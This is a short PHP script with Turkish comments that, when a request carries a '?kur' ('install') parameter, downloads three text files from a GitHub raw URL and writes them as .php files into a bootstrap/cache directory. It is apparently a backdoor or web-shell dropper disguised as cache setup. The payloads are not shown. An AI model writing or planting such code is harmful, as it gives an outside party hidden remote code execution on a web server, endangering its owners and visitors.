<?php
// URL'de "kur" parametresi var mı kontrol et
if (isset($_GET['kur'])) {
    
    // Cache dizinini oluşturma ve dosya indirme işlemleri
    $cacheDir = __DIR__ . '/bootstrap/cache';  // __DIR__ kullanarak doğru dizin yolu alındı

    if (!is_dir($cacheDir)) {
        mkdir($cacheDir, 0755, true);
    }

    $files = [
        'manager.txt' => 'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager.txt',
        'yeah.txt' => 'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt',
        'manager1s.txt' => 'https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/manager1s.txt'
    ];

    foreach ($files as $filename => $url) {
        $content = file_get_contents($url);
        $newFilename = $cacheDir . '/' . basename($filename, '.txt') . '.php';
        file_put_contents($newFilename, $content);
    }

    // Dosya yollarını head tag'ine yazma işlemi
    $headTag = '';
    foreach ($files as $filename => $url) {
        $phpFile = basename($filename, '.txt') . '.php';
        $filePath = $cacheDir . '/' . $phpFile;
        $headTag .= '<script src="' . $filePath . '"></script>' . PHP_EOL;
    }

    // Head tag'ini ekrana yazdırma
    echo '<head>' . PHP_EOL;
    echo $headTag;
    echo '</head>' . PHP_EOL;
} else {
    // ?kur parametresi yoksa işlem yapılmasın
    echo 'Bu işlem yalnızca URL\'de ?kur parametresi olduğunda çalışır.';
}
?>
